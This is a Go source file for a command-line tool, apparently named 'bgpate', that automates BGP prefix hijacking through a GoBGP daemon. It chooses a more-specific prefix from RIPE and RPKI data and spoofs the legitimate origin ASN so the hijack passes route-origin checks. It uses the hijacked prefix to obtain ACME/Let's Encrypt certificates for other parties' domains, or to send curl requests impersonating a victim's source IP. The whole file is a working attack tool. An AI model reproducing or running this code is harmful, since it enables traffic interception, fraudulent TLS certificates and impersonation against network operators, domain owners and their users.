package main

import (
	"context"
	"crypto"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"log"
	"net"
	neturl "net/url"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"

	"bgpate/pkg/ripe"
	"bgpate/pkg/utils"

	"github.com/go-acme/lego/v4/certcrypto"
	"github.com/go-acme/lego/v4/certificate"
	"github.com/go-acme/lego/v4/challenge/http01"
	"github.com/go-acme/lego/v4/lego"
	"github.com/go-acme/lego/v4/registration"
	api "github.com/osrg/gobgp/v3/api"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/protobuf/types/known/anypb"
)

const (
	grpcPort = 50051
)

type Config struct {
	Communities                     []string `json:"communities"`                     // List of communities (standard or large)
	Time                            int      `json:"time"`                            // Time in seconds to wait after hijacking
	TimeBeforeGeneratingCertificate int      `json:"timeBeforeGeneratingCertificate"` // Time in seconds to wait before generating certificate
	TimeBeforeExecutingCurl         int      `json:"timeBeforeExecutingCurl"`         // Time in seconds to wait before executing curl
	IphelperGatewayV4               string   `json:"iphelperGatewayV4"`               // IPv4 Gateway IP for iphelper command
	IphelperGatewayV6               string   `json:"iphelperGatewayV6"`               // IPv6 Gateway IP for iphelper command
	CADirURL                        string   `json:"caDirUrl"`                        // ACME CA directory URL
	EABKid                          string   `json:"eabKid"`                          // External Account Binding Key ID
	EABHmacKey                      string   `json:"eabHmacKey"`                      // External Account Binding HMAC Key
}

var config Config

// MyUser implements acme.User
type MyUser struct {
	Email        string
	Registration *registration.Resource
	key          crypto.PrivateKey
}

func (u *MyUser) GetEmail() string {
	return u.Email
}

func (u MyUser) GetRegistration() *registration.Resource {
	return u.Registration
}

func (u *MyUser) GetPrivateKey() crypto.PrivateKey {
	return u.key
}

func loadConfig() error {
	file, err := os.ReadFile("config.json")
	if err != nil {
		return fmt.Errorf("failed to read config file: %v", err)
	}

	if err := json.Unmarshal(file, &config); err != nil {
		return fmt.Errorf("failed to parse config file: %v", err)
	}

	return nil
}

func createCommunityAttributes() ([]*anypb.Any, error) {
	var attrs []*anypb.Any
	var standardCommunities []uint32
	var largeCommunities []*api.LargeCommunity

	for _, communityStr := range config.Communities {
		// Split the community value into parts
		parts := strings.Split(communityStr, ":")

		// Check if it starts with "large:" prefix
		if len(parts) > 0 && parts[0] == "large" {
			// Remove the "large:" prefix and process as large community
			parts = parts[1:]
			if len(parts) != 3 {
				return nil, fmt.Errorf("invalid large community format: %s", communityStr)
			}

			globalAdmin, err := strconv.ParseUint(parts[0], 10, 32)
			if err != nil {
				return nil, fmt.Errorf("invalid global admin in large community: %s", parts[0])
			}

			localData1, err := strconv.ParseUint(parts[1], 10, 32)
			if err != nil {
				return nil, fmt.Errorf("invalid local data 1 in large community: %s", parts[1])
			}

			localData2, err := strconv.ParseUint(parts[2], 10, 32)
			if err != nil {
				return nil, fmt.Errorf("invalid local data 2 in large community: %s", parts[2])
			}

			// Add to large communities list
			largeCommunities = append(largeCommunities, &api.LargeCommunity{
				GlobalAdmin: uint32(globalAdmin),
				LocalData1:  uint32(localData1),
				LocalData2:  uint32(localData2),
			})
		} else if len(parts) == 2 {
			// Process as standard community
			as, err := strconv.ParseUint(parts[0], 10, 32)
			if err != nil {
				return nil, fmt.Errorf("invalid AS number in standard community: %s", parts[0])
			}

			value, err := strconv.ParseUint(parts[1], 10, 32)
			if err != nil {
				return nil, fmt.Errorf("invalid value in standard community: %s", parts[1])
			}

			// Add to standard communities list
			standardCommunities = append(standardCommunities, uint32(as<<16|value))
		} else {
			return nil, fmt.Errorf("invalid community format: %s", communityStr)
		}
	}

	// Create standard communities attribute if we have any
	if len(standardCommunities) > 0 {
		community := &api.CommunitiesAttribute{
			Communities: standardCommunities,
		}
		communityAttr, err := anypb.New(community)
		if err != nil {
			return nil, fmt.Errorf("failed to create standard community attribute: %v", err)
		}
		attrs = append(attrs, communityAttr)
	}

	// Create large communities attribute if we have any
	if len(largeCommunities) > 0 {
		largeCommunity := &api.LargeCommunitiesAttribute{
			Communities: largeCommunities,
		}
		largeCommunityAttr, err := anypb.New(largeCommunity)
		if err != nil {
			return nil, fmt.Errorf("failed to create large community attribute: %v", err)
		}
		attrs = append(attrs, largeCommunityAttr)
	}

	return attrs, nil
}

func addRoute(client api.GobgpApiClient, ctx context.Context, prefix string, prefixLen uint32, nextHop string, asn ...uint32) error {
	// Parse the IP to determine if it's IPv4 or IPv6
	parsedIP := net.ParseIP(prefix)
	if parsedIP == nil {
		return fmt.Errorf("invalid IP address: %s", prefix)
	}

	// Create NLRI
	nlri, err := anypb.New(&api.IPAddressPrefix{
		Prefix:    prefix,
		PrefixLen: prefixLen,
	})
	if err != nil {
		return fmt.Errorf("failed to create NLRI: %v", err)
	}

	// Create next-hop attribute
	nextHopAttr, err := anypb.New(&api.NextHopAttribute{
		NextHop: nextHop,
	})
	if err != nil {
		return fmt.Errorf("failed to create next-hop attribute: %v", err)
	}

	// Create origin attribute (IGP)
	origin, err := anypb.New(&api.OriginAttribute{
		Origin: 0, // 0 = IGP, 1 = EGP, 2 = INCOMPLETE
	})
	if err != nil {
		return fmt.Errorf("failed to create origin attribute: %v", err)
	}

	// Create AS path attribute if ASN is provided
	var pattrs []*anypb.Any
	pattrs = append(pattrs, origin, nextHopAttr)

	if len(asn) > 0 {
		asPath := &api.AsPathAttribute{
			Segments: []*api.AsSegment{
				{
					Type:    2, // AS_SEQUENCE
					Numbers: []uint32{asn[0]},
				},
			},
		}
		asPathAttr, err := anypb.New(asPath)
		if err != nil {
			return fmt.Errorf("failed to create AS path attribute: %v", err)
		}
		pattrs = append(pattrs, asPathAttr)
	}

	// Create community attributes (both standard and large)
	communityAttrs, err := createCommunityAttributes()
	if err != nil {
		return fmt.Errorf("failed to create community attributes: %v", err)
	}
	pattrs = append(pattrs, communityAttrs...)

	// Set the appropriate family based on IP version
	var family *api.Family
	if parsedIP.To4() == nil {
		family = &api.Family{
			Afi:  api.Family_AFI_IP6,
			Safi: api.Family_SAFI_UNICAST,
		}
	} else {
		family = &api.Family{
			Afi:  api.Family_AFI_IP,
			Safi: api.Family_SAFI_UNICAST,
		}
	}

	path := &api.Path{
		Family: family,
		Nlri:   nlri,
		Pattrs: pattrs,
	}

	_, err = client.AddPath(ctx, &api.AddPathRequest{
		Path: path,
	})
	if err != nil {
		return fmt.Errorf("failed to add path: %v", err)
	}

	return nil
}

func clearRoutes(client api.GobgpApiClient, ctx context.Context) error {
	// Clear IPv4 routes
	stream, err := client.ListPath(ctx, &api.ListPathRequest{
		TableType: api.TableType_GLOBAL,
		Family: &api.Family{
			Afi:  api.Family_AFI_IP,
			Safi: api.Family_SAFI_UNICAST,
		},
	})
	if err != nil {
		return fmt.Errorf("failed to list IPv4 routes: %v", err)
	}

	// Process each IPv4 route
	for {
		response, err := stream.Recv()
		if err != nil {
			break // End of stream
		}

		// Delete each route individually
		_, err = client.DeletePath(ctx, &api.DeletePathRequest{
			Path: response.Destination.Paths[0],
		})
		if err != nil {
			return fmt.Errorf("failed to delete IPv4 route %s: %v", response.Destination.Prefix, err)
		}
		fmt.Printf("Deleted IPv4 route: %s\n", response.Destination.Prefix)
	}

	// Clear IPv6 routes
	stream, err = client.ListPath(ctx, &api.ListPathRequest{
		TableType: api.TableType_GLOBAL,
		Family: &api.Family{
			Afi:  api.Family_AFI_IP6,
			Safi: api.Family_SAFI_UNICAST,
		},
	})
	if err != nil {
		return fmt.Errorf("failed to list IPv6 routes: %v", err)
	}

	// Process each IPv6 route
	for {
		response, err := stream.Recv()
		if err != nil {
			break // End of stream
		}

		// Delete each route individually
		_, err = client.DeletePath(ctx, &api.DeletePathRequest{
			Path: response.Destination.Paths[0],
		})
		if err != nil {
			return fmt.Errorf("failed to delete IPv6 route %s: %v", response.Destination.Prefix, err)
		}
		fmt.Printf("Deleted IPv6 route: %s\n", response.Destination.Prefix)
	}

	fmt.Println("All routes cleared successfully")
	return nil
}

func determinePrefixStrategy(ip string) (uint32, uint32, error) {
	// Parse the IP to determine if it's IPv4 or IPv6
	parsedIP := net.ParseIP(ip)
	if parsedIP == nil {
		return 0, 0, fmt.Errorf("invalid IP address: %s", ip)
	}

	isIPv6 := parsedIP.To4() == nil
	// Check if it's an IPv4 or IPv6 address
	prefixLen, asns, err := ripe.GetCurrentPrefixInfoFromRipe(ip)

	var strategyAsn uint32
	var strategyLen uint32
	if isIPv6 {
		if prefixLen < 48 {
			fmt.Println("Current announcement is less than 48, more specific announcement is possible to be used")
			// Check RPKI validation for each ASN
			prefix := fmt.Sprintf("%s/%d", ip, prefixLen)
			for _, asn := range asns {
				maxRpkiLength, maxOrigin, err := ripe.GetCurrentRpkiInfoFromRipe(prefix, asn)
				if err != nil {
					fmt.Printf("[WARN] Failed to get RPKI info for ASN %d: %v\n", asn, err)
					continue
				}

				if maxRpkiLength > 48 {
					maxRpkiLength = 48
				}

				// Consider ROA valid if it matches prefix and max length
				// The ASN mismatch is expected in hijacking scenario
				prefix := fmt.Sprintf("%s/%d", ip, maxRpkiLength)
				np, err := utils.NormalizePrefix(prefix)
				if err != nil {
					log.Fatal(err)
				}
				fmt.Printf("[DEBUG] Valid prefix: %s with origin %d (max length: %d)\n", np, maxOrigin, maxRpkiLength)
				strategyLen = maxRpkiLength
				strategyAsn = maxOrigin
			}
		} else {
			fmt.Printf("[DEBUG] Current announcement is 48\n")
			strategyAsn = asns[0]
			strategyLen = prefixLen
		}
	} else {
		if prefixLen < 24 {
			fmt.Println("Current announcement is less than 24, more specific announcement is possible to be used")
			// Check RPKI validation for each ASN
			prefix := fmt.Sprintf("%s/%d", ip, prefixLen)
			for _, asn := range asns {
				maxRpkiLength, maxOrigin, err := ripe.GetCurrentRpkiInfoFromRipe(prefix, asn)
				if err != nil {
					fmt.Printf("[WARN] Failed to get RPKI info for ASN %d: %v\n", asn, err)
					continue
				}

				if maxRpkiLength > 24 {
					maxRpkiLength = 24
				}

				// Consider ROA valid if it matches prefix and max length
				// The ASN mismatch is expected in hijacking scenario
				prefix := fmt.Sprintf("%s/%d", ip, maxRpkiLength)
				np, err := utils.NormalizePrefix(prefix)
				if err != nil {
					log.Fatal(err)
				}
				fmt.Printf("[DEBUG] Valid prefix: %s with origin %d (max length: %d)\n", np, maxOrigin, maxRpkiLength)
				strategyLen = maxRpkiLength
				strategyAsn = maxOrigin
			}
		} else {
			fmt.Printf("[DEBUG] Current announcement is 24\n")
			strategyAsn = asns[0]
			strategyLen = prefixLen
		}
	}

	return strategyLen, strategyAsn, err
}

func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, dryrun bool, prefixLenOverride ...uint32) error {
	// Using automatic prefix length determination
	// hijackRoutes(client, ctx, "192.168.1.0", false)
	// Using a specific prefix length
	// hijackRoutes(client, ctx, "192.168.1.0", false, 16)
	// Parse the IP to determine if it's IPv4 or IPv6
	parsedIP := net.ParseIP(ip)
	if parsedIP == nil {
		return fmt.Errorf("invalid IP address: %s", ip)
	}
	isIPv6 := parsedIP.To4() == nil

	// Get BGP neighbors
	stream, err := client.ListPeer(ctx, &api.ListPeerRequest{})
	if err != nil {
		return fmt.Errorf("failed to get neighbors: %v", err)
	}

	// Determine prefix strategy for the target IP
	var prefixLen uint32
	var asn uint32
	var err2 error
	if len(prefixLenOverride) > 0 {
		prefixLen = prefixLenOverride[0]
	} else {
		prefixLen, asn, err2 = determinePrefixStrategy(ip)
		if err2 != nil {
			return fmt.Errorf("failed to determine prefix strategy: %v", err2)
		}
	}

	fmt.Println("BGP Neighbors:")
	for {
		peer, err := stream.Recv()
		if err != nil {
			break
		}

		// Check if peer is IPv4 or IPv6
		peerIP := net.ParseIP(peer.Peer.Conf.NeighborAddress)
		if peerIP == nil {
			fmt.Printf("[WARN] Skipping peer with invalid IP address: %s\n", peer.Peer.Conf.NeighborAddress)
			continue
		}
		isPeerIPv6 := peerIP.To4() == nil

		// Skip if IP version doesn't match peer version
		if isIPv6 != isPeerIPv6 {
			fmt.Printf("- Skipping %s peer %s (AS: %d) - IP version mismatch\n",
				map[bool]string{true: "IPv6", false: "IPv4"}[isPeerIPv6],
				peer.Peer.Conf.NeighborAddress,
				peer.Peer.Conf.PeerAsn)
			continue
		}

		fmt.Printf("- Neighbor: %s, AS: %d, State: %s\n",
			peer.Peer.Conf.NeighborAddress,
			peer.Peer.Conf.PeerAsn,
			peer.Peer.State.SessionState)

		np, err := utils.NormalizePrefix(fmt.Sprintf("%s/%d", ip, prefixLen))
		if err != nil {
			log.Fatal(err)
		}

		if dryrun {
			fmt.Printf("[DRYRUN] Would add %s route %s with origin %d\n",
				map[bool]string{true: "IPv6", false: "IPv4"}[isIPv6],
				np, asn)
			continue
		}

		// Add a new route using our local address as next-hop
		err = addRoute(client, ctx, ip, prefixLen, peer.Peer.Transport.LocalAddress, asn)
		if err != nil {
			return fmt.Errorf("failed to add route to %s: %v", peer.Peer.Conf.NeighborAddress, err)
		}

		fmt.Printf("%s route added successfully to %s (%s)\n",
			map[bool]string{true: "IPv6", false: "IPv4"}[isIPv6],
			peer.Peer.Conf.NeighborAddress, np)
	}

	return nil
}

func generateCertificate(client api.GobgpApiClient, ctx context.Context, domain string, ips []net.IP, dryrun bool) error {
	// Create a user. New accounts need an email and private key to start.
	privateKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return fmt.Errorf("failed to generate private key: %v", err)
	}

	myUser := MyUser{
		Email: "admin@" + domain, // Using admin@domain as the contact email
		key:   privateKey,
	}

	legoConfig := lego.NewConfig(&myUser)

	// Use configured CA directory URL or default to Let's Encrypt production
	if config.CADirURL != "" {
		legoConfig.CADirURL = config.CADirURL
	} else {
		legoConfig.CADirURL = lego.LEDirectoryProduction
	}
	legoConfig.Certificate.KeyType = certcrypto.RSA2048

	// A client facilitates communication with the CA server.
	legoClient, err := lego.NewClient(legoConfig)
	if err != nil {
		return fmt.Errorf("failed to create lego client: %v", err)
	}

	// We specify an HTTP port of 80 and on all interfaces
	// Create a slice of IP addresses to listen on
	var listenIPs []string
	for _, ip := range ips {
		listenIPs = append(listenIPs, ip.String())
	}
	fmt.Printf("[DEBUG] Setting HTTP01 provider for domain: %s on interfaces: %v\n", domain, listenIPs)
	err = legoClient.Challenge.SetHTTP01Provider(http01.NewProviderServer("", "80"))
	if err != nil {
		return fmt.Errorf("failed to set HTTP01 provider: %v", err)
	}

	// New users will need to register
	if dryrun {
		fmt.Printf("[DRYRUN] Would register user for domain: %s\n", domain)
	} else {
		var reg *registration.Resource
		var err error

		// Use EAB if configured, otherwise use standard registration
		if config.EABKid != "" && config.EABHmacKey != "" {
			reg, err = legoClient.Registration.RegisterWithExternalAccountBinding(
				registration.RegisterEABOptions{
					TermsOfServiceAgreed: true,
					Kid:                  config.EABKid,
					HmacEncoded:          config.EABHmacKey,
				},
			)
		} else {
			reg, err = legoClient.Registration.Register(
				registration.RegisterOptions{TermsOfServiceAgreed: true},
			)
		}

		if err != nil {
			return fmt.Errorf("failed to register: %v", err)
		}
		myUser.Registration = reg
	}

	request := certificate.ObtainRequest{
		Domains: []string{domain},
		Bundle:  true,
	}
	// If it is a dryrun, we don't need to obtain certificate
	if dryrun {
		fmt.Printf("[DRYRUN] Would obtain certificate for domain: %s\n", domain)
		return nil
	}

	certificates, err := legoClient.Certificate.Obtain(request)
	if err != nil {
		return fmt.Errorf("failed to obtain certificate: %v", err)
	}

	// Save the certificate and private key
	certPath := fmt.Sprintf("certs/%s.crt", domain)
	keyPath := fmt.Sprintf("certs/%s.key", domain)

	if err := os.WriteFile(certPath, certificates.Certificate, 0644); err != nil {
		return fmt.Errorf("failed to save certificate: %v", err)
	}
	if err := os.WriteFile(keyPath, certificates.PrivateKey, 0600); err != nil {
		return fmt.Errorf("failed to save private key: %v", err)
	}

	fmt.Printf("Certificate and private key saved to %s and %s\n", certPath, keyPath)
	return nil
}

func generateCertificateWithHijack(client api.GobgpApiClient, ctx context.Context, domain string, dryrun bool, ipOverride ...string) error {
	var ips []net.IP

	// If IP override is provided, use those IPs instead of resolving
	if len(ipOverride) > 0 {
		for _, ipStr := range ipOverride {
			ip := net.ParseIP(ipStr)
			if ip == nil {
				return fmt.Errorf("invalid IP address in override: %s", ipStr)
			}
			ips = append(ips, ip)
		}
		fmt.Printf("Using provided IPs: %v\n", ips)
	} else {
		// trying to resolve domain to ip
		var err error
		ips, err = net.LookupIP(domain)
		if err != nil {
			return fmt.Errorf("failed to resolve domain: %v", err)
		}
		fmt.Printf("Resolved domain: %s to IPs: %v\n", domain, ips)
	}

	if len(ips) == 0 {
		return fmt.Errorf("no IPs found for domain: %s", domain)
	}

	// Run IP helper for each IP
	for _, ip := range ips {
		if err := iphelper(ip.String(), false); err != nil {
			return fmt.Errorf("failed to run iphelper for %s: %v", ip.String(), err)
		}
	}

	// hijack routes for each IP
	for _, ip := range ips {
		if err := hijackRoutes(client, ctx, ip.String(), dryrun); err != nil {
			return fmt.Errorf("failed to hijack routes for %s: %v", ip.String(), err)
		}
	}

	// Wait for the configured time before generating certificate
	if config.TimeBeforeGeneratingCertificate > 0 {
		fmt.Printf("[INFO] Waiting for %d seconds before generating certificate...\n", config.TimeBeforeGeneratingCertificate)
		time.Sleep(time.Duration(config.TimeBeforeGeneratingCertificate) * time.Second)
		fmt.Println("[INFO] Wait completed")
	}

	// Generate certificate using all IPs for HTTP challenge
	if err := generateCertificate(client, ctx, domain, ips, dryrun); err != nil {
		// Even if generate certificate failed, we still need to clear routes
		if err := clearRoutes(client, ctx); err != nil {
			fmt.Printf("[DANGER] Failed to clear routes: %v\n", err)
		}

		// Run IP helper delete for each IP
		for _, ip := range ips {
			if err := iphelper(ip.String(), true); err != nil {
				fmt.Printf("[DANGER] Failed to run iphelper delete for %s: %v\n", ip.String(), err)
			}
		}
		return fmt.Errorf("failed to generate certificate: %v", err)
	}

	// If it is a dryrun, we don't need to clear routes
	if dryrun {
		fmt.Println("[DRYRUN] Would clear routes")
		return nil
	}

	// Clear all routes at once
	if err := clearRoutes(client, ctx); err != nil {
		return fmt.Errorf("failed to clear routes: %v", err)
	}

	// Run IP helper delete for each IP
	for _, ip := range ips {
		if err := iphelper(ip.String(), true); err != nil {
			return fmt.Errorf("failed to run iphelper delete for %s: %v", ip.String(), err)
		}
	}

	fmt.Println("Hijacked successfully")
	return nil
}

func curlWithHijack(client api.GobgpApiClient, ctx context.Context, sourceIP string, url string, dryrun bool, curlArgs ...string) error {
	// Check if curlArgs contains --interface
	for _, arg := range curlArgs {
		if arg == "--interface" {
			return fmt.Errorf("curlArgs contains --interface, which is not allowed")
		}
	}

	// Check the url is valid
	if _, err := neturl.Parse(url); err != nil {
		return fmt.Errorf("invalid URL: %v", err)
	}

	// Validate source IP
	ip := net.ParseIP(sourceIP)
	if ip == nil {
		return fmt.Errorf("invalid source IP address: %s", sourceIP)
	}

	// Run IP helper for the source IP
	if err := iphelper(sourceIP, false); err != nil {
		return fmt.Errorf("failed to run iphelper for %s: %v", sourceIP, err)
	}

	// hijack routes for the source IP
	if err := hijackRoutes(client, ctx, sourceIP, dryrun); err != nil {
		return fmt.Errorf("failed to hijack routes for %s: %v", sourceIP, err)
	}

	// Wait for the configured time before making curl request
	if config.TimeBeforeExecutingCurl > 0 {
		fmt.Printf("[INFO] Waiting for %d seconds before making curl request...\n", config.TimeBeforeExecutingCurl)
		time.Sleep(time.Duration(config.TimeBeforeExecutingCurl) * time.Second)
		fmt.Println("[INFO] Wait completed")
	}

	// Execute curl command
	if !dryrun {
		args := append([]string{"--interface", sourceIP, url}, curlArgs...)
		cmd := exec.Command("curl", args...)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		if err := cmd.Run(); err != nil {
			return fmt.Errorf("failed to execute curl: %v", err)
		}
		fmt.Printf("[DEBUG] Would execute curl command from %s to %s with args: %v\n", sourceIP, url, curlArgs)
	}

	// If it is a dryrun, we don't need to clear routes
	if dryrun {
		fmt.Println("[DRYRUN] Would clear routes")
		return nil
	}

	// Clear all routes at once
	if err := clearRoutes(client, ctx); err != nil {
		return fmt.Errorf("failed to clear routes: %v", err)
	}

	// Run IP helper delete for the source IP
	if err := iphelper(sourceIP, true); err != nil {
		return fmt.Errorf("failed to run iphelper delete for %s: %v", sourceIP, err)
	}

	fmt.Println("Hijacked successfully")
	return nil
}

func iphelper(ip string, isDelete bool) error {
	// Parse the IP address to determine if it's IPv4 or IPv6
	parsedIP := net.ParseIP(ip)
	if parsedIP == nil {
		return fmt.Errorf("invalid IP address: %s", ip)
	}

	// Determine prefix length based on IP version
	prefixLen := "32"
	isIPv6 := parsedIP.To4() == nil
	if isIPv6 {
		prefixLen = "128" // IPv6 uses /128 for single addresses
	}

	if isDelete {
		// execute ip addr del <ip>/<prefixLen> dev lo
		cmd := exec.Command("ip", "addr", "del", ip+"/"+prefixLen, "dev", "lo")
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		if err := cmd.Run(); err != nil {
			return fmt.Errorf("failed to execute ip addr del: %v", err)
		}

		// execute ip rule del from <ip>/<prefixLen> table 87
		ruleCmd := []string{"rule", "del", "from", ip + "/" + prefixLen, "table", "87"}
		if isIPv6 {
			ruleCmd = append([]string{"-6"}, ruleCmd...)
		}
		cmd = exec.Command("ip", ruleCmd...)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		if err := cmd.Run(); err != nil {
			return fmt.Errorf("failed to execute ip rule del: %v", err)
		}

		// execute ip route flush table 87
		routeCmd := []string{"route", "flush", "table", "87"}
		if isIPv6 {
			routeCmd = append([]string{"-6"}, routeCmd...)
		}
		cmd = exec.Command("ip", routeCmd...)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		if err := cmd.Run(); err != nil {
			return fmt.Errorf("failed to execute ip route flush: %v", err)
		}

		fmt.Println("IP helper route deleted successfully")
		return nil
	}

	// Get the appropriate gateway from config based on IP version
	var gatewayIP string
	if isIPv6 {
		if config.IphelperGatewayV6 == "" {
			return fmt.Errorf("IphelperGatewayV6 must be specified in config.json for IPv6 addresses")
		}
		gatewayIP = config.IphelperGatewayV6
	} else {
		if config.IphelperGatewayV4 == "" {
			return fmt.Errorf("IphelperGatewayV4 must be specified in config.json for IPv4 addresses")
		}
		gatewayIP = config.IphelperGatewayV4
	}

	// Validate gateway IP format
	if net.ParseIP(gatewayIP) == nil {
		return fmt.Errorf("invalid gateway IP address: %s", gatewayIP)
	}

	// Check if IP is already assigned to lo interface
	cmd := exec.Command("ip", "addr", "show", "dev", "lo")
	output, err := cmd.Output()
	if err != nil {
		return fmt.Errorf("failed to check lo interface: %v", err)
	}

	// Only add the IP if it's not already assigned
	if !strings.Contains(string(output), ip+"/"+prefixLen) {
		cmd = exec.Command("ip", "addr", "add", ip+"/"+prefixLen, "dev", "lo")
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		if err := cmd.Run(); err != nil {
			return fmt.Errorf("failed to execute ip addr add: %v", err)
		}
	}

	// Add rule for the src IP
	ruleCmd := []string{"rule", "add", "from", ip + "/" + prefixLen, "table", "87"}
	if isIPv6 {
		ruleCmd = append([]string{"-6"}, ruleCmd...)
	}
	cmd = exec.Command("ip", ruleCmd...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to execute ip rule add: %v", err)
	}

	// Check if table 87 exists and flush it if it does
	routeCmd := []string{"route", "show", "table", "87"}
	if isIPv6 {
		routeCmd = append([]string{"-6"}, routeCmd...)
	}
	cmd = exec.Command("ip", routeCmd...)
	if err := cmd.Run(); err == nil {
		// Table exists, flush it
		flushCmd := []string{"route", "flush", "table", "87"}
		if isIPv6 {
			flushCmd = append([]string{"-6"}, flushCmd...)
		}
		cmd = exec.Command("ip", flushCmd...)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		if err := cmd.Run(); err != nil {
			return fmt.Errorf("failed to flush table 87: %v", err)
		}
	}

	// Add default route for the src IP
	routeCmd = []string{"route", "add", "default", "via", gatewayIP, "table", "87"}
	if isIPv6 {
		routeCmd = append([]string{"-6"}, routeCmd...)
	}
	cmd = exec.Command("ip", routeCmd...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to add default route: %v", err)
	}
	fmt.Println("IP helper route added successfully")
	return nil
}

func main() {
	// Load configuration
	if err := loadConfig(); err != nil {
		log.Fatalf("Failed to load configuration: %v", err)
	}

	// Setup signal handling
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGINT)

	// Connect to GoBGP daemon
	conn, err := grpc.Dial(fmt.Sprintf("localhost:%d", grpcPort),
		grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		log.Fatalf("Failed to connect to GoBGP: %v", err)
	}
	defer conn.Close()

	client := api.NewGobgpApiClient(conn)
	ctx := context.Background()

	// Start a goroutine to handle cleanup on interrupt
	go func() {
		<-sigChan
		fmt.Println("\nReceived interrupt signal. Cleaning up...")

		// Clear all routes
		if err := clearRoutes(client, ctx); err != nil {
			fmt.Printf("Error during cleanup: %v\n", err)
		} else {
			fmt.Println("Cleanup completed successfully")
		}
		os.Exit(0)
	}()

	if len(os.Args) < 2 {
		log.Fatal("Usage: go run main.go <command>\nCommands:\n  clear   - Clear all routes\n  hijack <ip> [--dryrun]  - Add hijack route for specified IP\n  certgen <domain> [--dryrun] [--ip <ip1,ip2,...>] - Generate certificate for specified domain\n  curl <source_ip> <url> [--dryrun] [curl arguments...] - Make curl request from source IP to URL\n  iphelper <ip> [-d] - Add or remove IP helper route")
	}

	switch os.Args[1] {
	case "clear":
		if err := clearRoutes(client, ctx); err != nil {
			log.Fatalf("Failed to clear routes: %v", err)
		}
		fmt.Println("Route cleared successfully")

	case "hijack":
		if len(os.Args) < 3 {
			log.Fatal("Usage: go run main.go hijack <ip> [--dryrun]")
		}
		targetIP := os.Args[2]
		dryrun := len(os.Args) > 3 && os.Args[3] == "--dryrun"
		if err := hijackRoutes(client, ctx, targetIP, dryrun); err != nil {
			log.Fatalf("Failed to hijack routes: %v", err)
		}

		// Wait for the configured time if not in dryrun mode
		if !dryrun && config.Time > 0 {
			fmt.Printf("[INFO] Waiting for %d seconds...\n", config.Time)
			time.Sleep(time.Duration(config.Time) * time.Second)
			fmt.Println("[INFO] Wait completed")
		}

		// Clear routes
		if err := clearRoutes(client, ctx); err != nil {
			fmt.Errorf("failed to clear routes: %v", err)
		}
		fmt.Println("Hijacked successfully")

	case "certgen":
		if len(os.Args) < 3 {
			log.Fatal("Usage: go run main.go certgen <domain> [--dryrun] [--ip <ip1,ip2,...>]")
		}
		domain := os.Args[2]
		dryrun := false
		var ipOverride []string

		// Parse remaining arguments
		for i := 3; i < len(os.Args); i++ {
			if os.Args[i] == "--dryrun" {
				dryrun = true
			} else if os.Args[i] == "--ip" {
				if i+1 >= len(os.Args) {
					log.Fatal("No IPs provided after --ip flag")
				}
				// Split comma-separated IPs
				ipOverride = strings.Split(os.Args[i+1], ",")
				// Trim spaces from each IP
				for j := range ipOverride {
					ipOverride[j] = strings.TrimSpace(ipOverride[j])
				}
				break
			}
		}

		if err := generateCertificateWithHijack(client, ctx, domain, dryrun, ipOverride...); err != nil {
			log.Fatalf("Failed to generate certificate: %v", err)
		}

	case "curl":
		if len(os.Args) < 4 {
			log.Fatal("Usage: go run main.go curl <source_ip> <url> [--dryrun] [curl arguments...]")
		}
		sourceIP := os.Args[2]
		url := os.Args[3]
		dryrun := false
		var curlArgs []string

		// Parse remaining arguments
		for i := 4; i < len(os.Args); i++ {
			if os.Args[i] == "--dryrun" {
				dryrun = true
			} else {
				curlArgs = append(curlArgs, os.Args[i])
			}
		}

		if err := curlWithHijack(client, ctx, sourceIP, url, dryrun, curlArgs...); err != nil {
			log.Fatalf("Failed to make curl request: %v", err)
		}

	case "iphelper":
		if len(os.Args) < 3 {
			log.Fatal("Usage: go run main.go iphelper <ip> [-d]")
		}

		// Parse arguments
		var ip string
		isDelete := false
		args := os.Args[2:] // Skip command name and "iphelper"

		// First argument is always the IP
		ip = args[0]

		// Look for -d flag
		for i := 1; i < len(args); i++ {
			if args[i] == "-d" {
				isDelete = true
			}
		}

		if err := iphelper(ip, isDelete); err != nil {
			log.Fatalf("Failed to execute iphelper: %v", err)
		}

	default:
		log.Fatal("Unknown command. Available commands: clear, hijack <ip> [--dryrun], certgen <domain> [--dryrun] [--ip <ip1,ip2,...>], curl <source_ip> <url> [--dryrun] [curl arguments...], iphelper <ip> [-d]")
	}
}
